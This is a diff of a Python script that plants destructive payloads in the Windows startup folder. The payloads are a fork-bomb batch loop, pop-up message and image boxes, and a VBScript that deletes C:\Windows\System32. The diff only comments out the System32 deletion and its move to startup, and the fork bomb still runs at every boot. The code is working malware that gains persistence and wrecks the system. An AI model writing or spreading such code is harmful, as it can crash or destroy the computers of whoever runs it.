@@ -72,19 +72,19 @@ with open(forkbomb_directory, "w") as bat_file:
   bat_file.write('loop\n')
 
 # Create file that deletes System32 on boot
-sysdel_directory = "sysdel.vbs"
-with open(sysdel_directory, "w") as vbs_file:
-  vbs_file.write('Dim FSO, Folder')
-  vbs_file.write('set FSO=CreateObject("Scripting.FileSystemObject")')
-  vbs_file.write('Folder="C:\Windows\System32"')
-  vbs_file.write('FSO.DeleteFolder(Folder)')
+#sysdel_directory = "sysdel.vbs"
+#with open(sysdel_directory, "w") as vbs_file:
+#  vbs_file.write('Dim FSO, Folder')
+#  vbs_file.write('set FSO=CreateObject("Scripting.FileSystemObject")')
+#  vbs_file.write('Folder="C:\Windows\System32"')
+#  vbs_file.write('FSO.DeleteFolder(Folder)')
 
 # Move the "startup" file to the startup directory
 shutil.move(text_directory, startup_directory)
 shutil.move(errorbox_directory, startup_directory)
 shutil.move(imagebox_directory, startup_directory)
 shutil.move(forkbomb_directory, startup_directory)
-shutil.move(sysdel_directory, startup_directory)
+#shutil.move(sysdel_directory, startup_directory)
 print("Files moved successfully.")
 
 # Random Text Generator
